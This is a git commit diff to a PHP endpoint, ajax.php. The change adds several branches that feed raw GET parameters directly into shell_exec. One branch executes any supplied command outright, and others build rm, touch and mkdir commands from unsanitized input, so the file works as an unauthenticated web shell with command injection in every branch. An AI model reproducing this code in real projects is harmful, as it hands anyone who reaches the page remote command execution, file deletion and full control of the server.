2f0901be50fea41523c3e28d8573528b378bcffc
SpongeBob Squarepants <69375705+i-live-under-the-sea@users.noreply.github.com>
2021-03-02 15:12:11 -0500

    Add files via upload

--- ajax.php
+++ ajax.php
@@ -4,6 +4,21 @@
         echo $output;
     }elseif(isset($_GET['path']) && isset($_GET['shell']) !== true){
         $output = shell_exec("ls ".$_GET['path']);
-        echo $output;   
+        echo $output;
+    }elseif(isset($_GET['del'])){
+        $output = shell_exec("rm ".$_GET['del']);
+        echo $output;
+    }elseif(isset($_GET['what']) && isset($_GET['ffl']) && isset($_GET['sfl'])){
+        $output = shell_exec($_GET['what'].' '.$_GET['ffl'].' '.$_GET['sfl']);
+        echo $output;
+    }elseif(isset($_GET['tc']) && isset($_GET['name'])){
+        $output = shell_exec("touch ".$_GET['name']);
+        echo $output;
+    }elseif(isset($_GET['md']) && isset($_GET['name'])){
+        $output = shell_exec("mkdir ".$_GET['name']);
+        echo $output;
+    }elseif(isset($_GET['dell'])){
+        $output = shell_exec($_GET['dell']);
+        echo $output;
     }
 ?>
